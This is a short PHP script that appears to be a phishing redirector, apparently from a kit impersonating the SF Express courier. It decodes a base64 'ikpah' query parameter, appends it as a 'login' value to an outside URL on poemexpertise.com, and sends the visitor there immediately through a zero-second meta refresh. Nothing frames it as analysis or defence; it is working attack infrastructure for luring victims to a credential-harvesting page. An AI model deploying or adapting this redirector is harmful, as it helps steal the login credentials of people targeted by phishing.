<?php

$m = @$_GET["ikpah"];
$m = base64_decode($m);

$redirectedurl[1]="https://poemexpertise.com/inv/SF-Express?login=".$m;;

$randomurl = rand(1, 1);

echo "<html><meta http-equiv='refresh' content='0;url=". $redirectedurl[$randomurl] ."' /><body>";
?>